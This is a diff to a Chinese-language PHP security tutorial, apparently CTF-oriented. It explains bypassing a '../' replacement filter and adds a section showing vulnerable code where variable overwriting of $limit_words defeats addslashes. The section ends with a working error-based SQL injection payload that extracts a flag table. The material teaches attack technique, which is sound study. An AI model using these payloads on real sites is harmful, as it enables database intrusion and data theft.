@@ -86,3 +86,42 @@ if(!strpos($pass,'>'))
 str_replace('../','',$language)；
 ```
 程序仅仅只是将 **../** 字符替换成空，这并不能阻止攻击者进行攻击。例如攻击者使用payload：**....//** 或者 **..././** ，在经过程序的 **str_replace** 函数处理后，都会变成 **../**
+
+
+^
+#### **9、变量覆盖逃逸addslashes**
+```
+if(isset($_POST['msg']) && $_POST['msg'] !==''){
+    $msg = addslashes($_POST['msg']);
+    $msg = replace_bad_word(convert($msg));
+    $sql = "INSERT INTO users VALUES($id,'".$msg."')";
+    $result = $conn->query($sql);
+    if($conn->error) die($conn->error);
+}
+
+function replace_bad_word($str){
+    global $limit_words;
+    foreach ($limit_words as $old => $new) {
+        strlen($old) > 2 && $str = str_replace($old,trim($new),$str);
+    }
+    return $str;
+}
+
+function convert($str){
+    return htmlentities($str);
+}
+
+$limit_words = array('造反' => '造**', '法hh' => '法**');
+
+foreach (array('_GET','_POST') as $method) {
+    foreach ($$method as $key => $value) {
+        $$key = $value;
+    }
+}
+```
+```
+这里，我们便可以通过变量覆盖 **$limit_words** 数组，来逃逸单引号，
+因为在 **index.php** 文件中使用了 **addslashes** 函数。
+
+msg=1%00' and updatexml(1,concat(0x7e,(select * from flag),0x7e),1))#&limit_words[\0\]=
+```
